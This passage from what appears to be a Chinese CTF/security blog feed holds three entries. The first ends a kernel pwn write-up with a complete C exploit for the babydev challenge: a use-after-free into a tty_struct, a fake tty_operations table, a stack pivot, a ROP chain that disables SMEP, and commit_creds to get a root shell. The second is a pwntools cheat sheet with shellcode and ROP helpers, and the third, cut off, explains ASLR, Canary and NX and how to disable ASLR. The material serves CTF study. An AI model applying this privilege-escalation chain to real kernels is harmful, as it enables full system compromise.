class="number">9</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> receive_room;  <span class="comment">/* Bytes free for queue */</span></span><br><span class="line">    <span class="keyword">int</span> flow_change;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">link</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync</span>;</span></span><br><span class="line">    <span class="keyword">wait_queue_head_t</span> write_wait;</span><br><span class="line">    <span class="keyword">wait_queue_head_t</span> read_wait;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">hangup_work</span>;</span></span><br><span class="line">    <span class="keyword">void</span> *disc_data;</span><br><span class="line">    <span class="keyword">void</span> *driver_data;</span><br><span class="line">    <span class="keyword">spinlock_t</span> files_lock;      <span class="comment">/* protects tty_files list */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">tty_files</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N_TTY_BUF_SIZE 4096</span></span><br><span class="line">    <span class="keyword">int</span> closing;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *write_buf;</span><br><span class="line">    <span class="keyword">int</span> write_cnt;</span><br><span class="line">    <span class="comment">/* If the tty has a pending do_SAK, queue it here - akpm */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">SAK_work</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_port</span> *<span class="title">port</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><p>其中有一个很有趣的结构体<code>tty_operations</code>, <a href="https://code.woboq.org/linux/linux/include/linux/tty_driver.h.html#tty_operations">源码</a> 如下:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,</span></span><br><span class="line"><span class="class">            <span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line">    <span class="keyword">int</span>  (*install)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*remove)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*open)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">    <span class="keyword">void</span> (*close)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">    <span class="keyword">void</span> (*shutdown)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*cleanup)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*write)(struct tty_struct * tty,</span><br><span class="line">              <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf, <span class="keyword">int</span> count);</span><br><span class="line">    <span class="keyword">int</span>  (*put_char)(struct tty_struct *tty, <span class="keyword">unsigned</span> <span class="keyword">char</span> ch);</span><br><span class="line">    <span class="keyword">void</span> (*flush_chars)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*write_room)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*chars_in_buffer)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*ioctl)(struct tty_struct *tty,</span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">    <span class="keyword">long</span> (*compat_ioctl)(struct tty_struct *tty,</span><br><span class="line">                 <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">    <span class="keyword">void</span> (*set_termios)(struct tty_struct *tty, struct ktermios * old);</span><br><span class="line">    <span class="keyword">void</span> (*throttle)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*unthrottle)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*stop)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*start)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*hangup)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*break_ctl)(struct tty_struct *tty, <span class="keyword">int</span> state);</span><br><span class="line">    <span class="keyword">void</span> (*flush_buffer)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*set_ldisc)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*wait_until_sent)(struct tty_struct *tty, <span class="keyword">int</span> timeout);</span><br><span class="line">    <span class="keyword">void</span> (*send_xchar)(struct tty_struct *tty, <span class="keyword">char</span> ch);</span><br><span class="line">    <span class="keyword">int</span> (*tiocmget)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*tiocmset)(struct tty_struct *tty,</span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">set</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span> clear);</span><br><span class="line">    <span class="keyword">int</span> (*resize)(struct tty_struct *tty, struct winsize *ws);</span><br><span class="line">    <span class="keyword">int</span> (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);</span><br><span class="line">    <span class="keyword">int</span> (*get_icount)(struct tty_struct *tty,</span><br><span class="line">                struct serial_icounter_struct *icount);</span><br><span class="line">    <span class="keyword">void</span> (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CONSOLE_POLL</span></span><br><span class="line">    <span class="keyword">int</span> (*poll_init)(struct tty_driver *driver, <span class="keyword">int</span> line, <span class="keyword">char</span> *options);</span><br><span class="line">    <span class="keyword">int</span> (*poll_get_char)(struct tty_driver *driver, <span class="keyword">int</span> line);</span><br><span class="line">    <span class="keyword">void</span> (*poll_put_char)(struct tty_driver *driver, <span class="keyword">int</span> line, <span class="keyword">char</span> ch);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> (*proc_show)(struct seq_file *, <span class="keyword">void</span> *);</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><p>大把的函数指针, 因此设想构造下图所示结构体</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fake_tty_struct  fake_tty_operations</span><br><span class="line">+---------+      +----------+</span><br><span class="line">|magic    |  +--&gt;|evil 1    |</span><br><span class="line">+---------+  |   +----------+</span><br><span class="line">|......   |  |   |evil 2    |</span><br><span class="line">|......   |  |   +----------+</span><br><span class="line">+---------+  |   |evil 3    |</span><br><span class="line">|*ops     |--+   +----------+</span><br><span class="line">+---------+      |evil 4    |</span><br><span class="line">|......   |      +----------+</span><br><span class="line">|......   |      |......    |</span><br><span class="line">+---------+      +----------+</span><br></pre></td></tr></table></figure><p>那么我们就可以通过不同的操作（如 <code>write, ioctl</code> 等）来跳转到不同的 <code>evil</code>了。</p><p>对于这道题而言, 因为开启了 smep 保护, 如果想要 ret2usr 提权, 需要修改 cr4 的值, 而控制函数指针是不够的, 可以控制函数指针进行 stack pivot 等操作到我们排布 rop 链的空间,通过 rop 关闭 smep,进而进行后续操作。</p><blockquote><p>这道题目没给 vmlinux,需要使用 extract-vmlinux 解压内核镜像。</p></blockquote><p>关闭 smep 保护后,就可以通过 rop 来为所欲为了,最终的 exp 如下:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prepare_kernel_cred_addr 0xffffffff810a1810</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> commit_creds_addr 0xffffffff810a1420</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span>* fake_tty_operations[<span class="number">30</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_root</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* (*pkc)(<span class="keyword">int</span>) = prepare_kernel_cred_addr;</span><br><span class="line">    <span class="keyword">void</span> (*cc)(<span class="keyword">char</span>*) = commit_creds_addr;</span><br><span class="line">    (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> rop[<span class="number">32</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff810d238d</span>;      <span class="comment">// pop rdi; ret;</span></span><br><span class="line">    rop[i++] = <span class="number">0x6f0</span>;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81004d80</span>;      <span class="comment">// mov cr4, rdi; pop rbp; ret;</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = (<span class="keyword">size_t</span>)get_root;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81063694</span>;      <span class="comment">// swapgs; pop rbp; ret;</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff814e35ef</span>;      <span class="comment">// iretq; ret;</span></span><br><span class="line">    rop[i++] = (<span class="keyword">size_t</span>)get_shell;</span><br><span class="line">    rop[i++] = user_cs;                <span class="comment">/* saved CS */</span></span><br><span class="line">    rop[i++] = user_rflags;            <span class="comment">/* saved EFLAGS */</span></span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">30</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        fake_tty_operations[i] = <span class="number">0xFFFFFFFF8181BFC5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    fake_tty_operations[<span class="number">0</span>] = <span class="number">0xffffffff810635f5</span>;  <span class="comment">//pop rax; pop rbp; ret;</span></span><br><span class="line">    fake_tty_operations[<span class="number">1</span>] = (<span class="keyword">size_t</span>)rop;</span><br><span class="line">    fake_tty_operations[<span class="number">3</span>] = <span class="number">0xFFFFFFFF8181BFC5</span>;  <span class="comment">// mov rsp,rax ; dec ebx ; ret</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, O_RDWR);</span><br><span class="line">    ioctl(fd1, <span class="number">0x10001</span>, <span class="number">0x2e0</span>);</span><br><span class="line">    close(fd1);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd_tty = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR|O_NOCTTY);</span><br><span class="line">    <span class="keyword">size_t</span> fake_tty_struct[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    read(fd2, fake_tty_struct, <span class="number">32</span>);</span><br><span class="line">    fake_tty_struct[<span class="number">3</span>] = (<span class="keyword">size_t</span>)fake_tty_operations;</span><br><span class="line">    write(fd2,fake_tty_struct, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x8</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    write(fd_tty, buf, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
          <category> Pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwntools</title>
      <link href="/note-tool-pwntools/"/>
      <url>/note-tool-pwntools/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p><a href="http://docs.pwntools.com/en/stable/">pwntools 英文文档</a><br><a href="https://pwntools-docs-zh.readthedocs.io/zh_CN/dev/about.html">pwntools 中文文档</a></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python</span><br><span class="line">pip</span><br><span class="line">libssl-dev</span><br><span class="line">libffi-dev</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install libssl-dev</span><br><span class="line">sudo apt install libffi-dev</span><br><span class="line">sudo pip install pwntools</span><br></pre></td></tr></table></figure><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><blockquote><p>以下只是常用命令</p></blockquote><h3 id="导入"><a href="#导入" class="headerlink" title="导入"></a>导入</h3><p>导入pwntools模块</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br></pre></td></tr></table></figure><h3 id="context"><a href="#context" class="headerlink" title="context"></a>context</h3><p>Log等级</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span> <span class="comment"># 打印调试信息</span></span><br><span class="line">context.log_level = <span class="string">&quot;error&quot;</span> <span class="comment"># 打印错误信息, 此时很多回显就看不到了</span></span><br></pre></td></tr></table></figure><p>或者在调用时使用 DEBUG 参数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 exp.py DEBUG</span><br></pre></td></tr></table></figure><p>指定cpu类型, 操作系统类型, 端序, 位数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">context.arch      = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.os        = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.endian    = <span class="string">&#x27;little&#x27;</span></span><br><span class="line">context.word_size = <span class="number">32</span></span><br></pre></td></tr></table></figure><p>在tmux中以分屏的形式启动gdb</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>] <span class="comment"># 横向</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-v&#x27;</span>] <span class="comment"># 纵向</span></span><br></pre></td></tr></table></figure><h3 id="启动程序"><a href="#启动程序" class="headerlink" title="启动程序"></a>启动程序</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>) <span class="comment"># 本地</span></span><br><span class="line">p = remote(ip, port) <span class="comment"># e.g. p = remote(&quot;10.10.10.10&quot;, 23946) 远程交互</span></span><br></pre></td></tr></table></figure><h4 id="绑定libc"><a href="#绑定libc" class="headerlink" title="绑定libc"></a>绑定libc</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = process([<span class="string">&#x27;./bin&#x27;</span>], env=&#123;<span class="string">&#x27;LOAD_PRELOAD&#x27;</span>: <span class="string">&#x27;./libc-2.23.so&#x27;</span>&#125;)</span><br></pre></td></tr></table></figure><h3 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">gdb.attach(p, <span class="string">&quot;b read&quot;</span>) <span class="comment"># &quot;b read&quot;为gdb开启后执行的命令</span></span><br></pre></td></tr></table></figure><h3 id="IO模块"><a href="#IO模块" class="headerlink" title="IO模块"></a>IO模块</h3><p>发送信息</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.send(data) <span class="comment"># 不带回车</span></span><br><span class="line">p.sendline(data) <span class="comment"># 带回车</span></span><br><span class="line">p.sendafter(delim, data, timeout = default) <span class="comment">#  recvuntil（delim, timeout = timeout）和send（data）的组合。</span></span><br><span class="line">p.sendlineafter(delim, data, timeout = default) <span class="comment">#  recvuntil（delim, timeout = timeout）和sendline（data）的组合。</span></span><br></pre></td></tr></table></figure><p>接受信息</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.recv(number) <span class="comment"># 接收number个字节的信息, number可省略</span></span><br><span class="line">p.recvline() <span class="comment"># 接收一行信息</span></span><br><span class="line">p.recvuntil(msg) <span class="comment"># 接受信息直到msg出现</span></span><br></pre></td></tr></table></figure><p>启动交互</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>打印信息</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">log.success(<span class="string">&quot;msg&quot;</span>)</span><br><span class="line">log.info(<span class="string">&quot;msg&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="Shellcode-生成器"><a href="#Shellcode-生成器" class="headerlink" title="Shellcode 生成器"></a>Shellcode 生成器</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">shellcraft.i386.linux.sh()</span><br></pre></td></tr></table></figure><p>打印出来:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(shellcraft.i386.linux.sh())</span><br><span class="line">    /* execve(path=<span class="string">&#x27;/bin///sh&#x27;</span>, argv=[<span class="string">&#x27;sh&#x27;</span>], envp=<span class="number">0</span>) */</span><br><span class="line">    /* push <span class="string">b&#x27;/bin///sh\x00&#x27;</span> */</span><br><span class="line">    push <span class="number">0x68</span></span><br><span class="line">    push <span class="number">0x732f2f2f</span></span><br><span class="line">    push <span class="number">0x6e69622f</span></span><br><span class="line">    mov ebx, esp</span><br><span class="line">    /* push argument array [<span class="string">&#x27;sh\x00&#x27;</span>] */</span><br><span class="line">    /* push <span class="string">&#x27;sh\x00\x00&#x27;</span> */</span><br><span class="line">    push <span class="number">0x1010101</span></span><br><span class="line">    xor dword ptr [esp], <span class="number">0x1016972</span></span><br><span class="line">    xor ecx, ecx</span><br><span class="line">    push ecx /* null terminate */</span><br><span class="line">    push <span class="number">4</span></span><br><span class="line">    pop ecx</span><br><span class="line">    add ecx, esp</span><br><span class="line">    push ecx /* <span class="string">&#x27;sh\x00&#x27;</span> */</span><br><span class="line">    mov ecx, esp</span><br><span class="line">    xor edx, edx</span><br><span class="line">    /* call execve() */</span><br><span class="line">    push SYS_execve /* <span class="number">0xb</span> */</span><br><span class="line">    pop eax</span><br><span class="line">    <span class="built_in">int</span> <span class="number">0x80</span></span><br></pre></td></tr></table></figure><p>结合 asm 可以得到最终的 payload</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">shellcode = asm(shellcraft.amd64.linux.sh())</span><br></pre></td></tr></table></figure><p>除了直接执行sh之外，还可以进行其它的一些常用操作例如提权、反向连接等等。</p><h3 id="pack-and-unpack"><a href="#pack-and-unpack" class="headerlink" title="pack and unpack"></a>pack and unpack</h3><p>pack: p8, p16, p32, p64<br>unpack: u8, u16, u32, u64</p><p>示例</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x80</span> + p64(sys_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__malloc_hook_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&quot;\x00&quot;</span>))</span><br></pre></td></tr></table></figure><h3 id="ROP链生成器"><a href="#ROP链生成器" class="headerlink" title="ROP链生成器"></a>ROP链生成器</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">elf = ELF(<span class="string">&#x27;ropasaurusrex&#x27;</span>)</span><br><span class="line">rop = ROP(elf)</span><br><span class="line">rop.read(<span class="number">0</span>, elf.bss(<span class="number">0x80</span>))</span><br><span class="line">rop.dump()</span><br><span class="line"><span class="comment"># [&#x27;0x0000:        0x80482fc (read)&#x27;,</span></span><br><span class="line"><span class="comment">#  &#x27;0x0004:       0xdeadbeef&#x27;,</span></span><br><span class="line"><span class="comment">#  &#x27;0x0008:              0x0&#x27;,</span></span><br><span class="line"><span class="comment">#  &#x27;0x000c:        0x80496a8&#x27;]</span></span><br><span class="line"><span class="built_in">str</span>(rop)</span><br><span class="line"><span class="comment"># &#x27;\xfc\x82\x04\x08\xef\xbe\xad\xde\x00\x00\x00\x00\xa8\x96\x04\x08&#x27;</span></span><br></pre></td></tr></table></figure><p>因为ROP对象实现了getattr的功能，可以直接通过func call的形式来添加函数，rop.read(0, elf.bss(0x80))实际相当于rop.call(‘read’, (0, elf.bss(0x80)))。<br>通过多次添加函数调用，最后使用str将整个rop chain dump出来就可以了。</p><ul><li>call(resolvable, arguments=()) : 添加一个调用，resolvable可以是一个符号，也可以是一个int型地址，注意后面的参数必须是元组否则会报错，即使只有一个参数也要写成元组的形式(在后面加上一个逗号)</li><li>chain() : 返回当前的字节序列，即payload</li><li>dump() : 直观地展示出当前的rop chain</li><li>raw() : 在rop chain中加上一个整数或字符串</li><li>search(move=0, regs=None, order=’size’) : 按特定条件搜索gadget</li><li>unresolve(value) : 给出一个地址，反解析出符号</li></ul><h2 id="常用模板"><a href="#常用模板" class="headerlink" title="常用模板"></a>常用模板</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf_name = <span class="string">&quot;./filename&quot;</span></span><br><span class="line"></span><br><span class="line">p = process([elf_name], env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span>: <span class="string">&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">elf = ELF(elf_name)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-v&#x27;</span>]</span><br><span class="line"></span><br><span class="line">rv = p.recv</span><br><span class="line">ru = p.recvuntil</span><br><span class="line">sd = p.send</span><br><span class="line">sa = p.sendafter</span><br><span class="line">sl = p.sendline</span><br><span class="line">sla = p.sendlineafter</span><br><span class="line">ia = p.interactive</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>(<span class="params"><span class="built_in">breakpoint</span></span>):</span></span><br><span class="line">    gdb.attach(p, <span class="string">&quot;b &quot;</span> + <span class="built_in">breakpoint</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.jianshu.com/p/355e4badab50">pwntools使用</a></p>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
          <category> Tool </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tool </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 常用保护机制</title>
      <link href="/note-pwn-linux-protect/"/>
      <url>/note-pwn-linux-protect/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="检查防护措施"><a href="#检查防护措施" class="headerlink" title="检查防护措施"></a>检查防护措施</h2><p>pwndbg 自带 <a href="https://github.com/slimm609/checksec.sh">checksec</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; checksec</span><br><span class="line">[*] <span class="string">&#x27;/ctf/work/datastore&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><h2 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p><code>ASLR (Address Space Layout Randomization)</code>, 地址空间配置随机加载, 简称<code>地址随机化</code>, 是一种针对缓冲区溢出的安全保护技术, 通过对堆、栈、共享库映射等线性区布局的随机化, 通过增加攻击者预测目的地址的难度, 防止攻击者直接定位攻击代码位置, 达到阻止溢出攻击的目的的一种技术。</p><p>有以下三种情况</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0 - 表示关闭进程地址空间随机化。</span><br><span class="line">1 - 表示将mmap的基址, stack和vdso页面随机化。</span><br><span class="line">2 - 表示在1的基础上增加栈（heap）的随机化。</span><br></pre></td></tr></table></figure><p>可以防范基于Ret2libc方式的针对DEP的攻击。ASLR和DEP配合使用, 能有效阻止攻击者在堆栈上运行恶意代码。</p><h3 id="关闭-ASLR"><a href="#关闭-ASLR" class="headerlink" title="关闭 ASLR"></a>关闭 ASLR</h3><p>为了方便我们调试, 可以在自己的系统上关闭ASLR来确认偏移等等</p><p>Ubuntu 下:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo sysctl -w kernel.randomize_va_space=0</span><br></pre></td></tr></table></figure><h3 id="绕过-ASLR"><a href="#绕过-ASLR" class="headerlink" title="绕过 ASLR"></a>绕过 ASLR</h3><p><strong>程序信息泄露</strong>: 目前广泛应用在操作系统的地址随机化多为粗粒度的实现方式, 同一模块中的所有代码与数据的相对偏移固定。只需要通过信息泄露漏洞将某个模块中的任一代码指针或者数据指针泄露, 即可通过计算得到此模块中任意代码或数据的地址</p><h2 id="Canary"><a href="#Canary" class="headerlink" title="Canary"></a>Canary</h2><p><a href="https://lantern.cool/note-pwn-canary/">Canary</a></p><h3 id="绕过-Canary"><a href="#绕过-Canary" class="headerlink" title="绕过 Canary"></a>绕过 Canary</h3><p>程序信息泄露</p><h3 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h3><p><code>NX(Non-eXecute)</code>位是一种针对 shellcode 执行攻击的保护措施, 意在更有效地识别数据区和代码区。通过在内存页的标识中增加”执行”位, 可以表示该内存页是否执行, 若程序代码的 EIP 执行至不可运行的内存页, 则 CPU 将直接拒绝执行”指令”造成程序崩溃。</p><p>在 Linux 中, 当装载器把程序装载进内存空间后, 将程序的<code>.text</code>段标记为可执行, 而其余的数据段(<code>.data, .bss等</code>)以及栈、堆均不可执行。当攻击者在堆栈上部署自己的 <code>shellcode</code> 并触发时, 只会直接造成程序的崩溃。</p><p>工作原理如图:<br><img 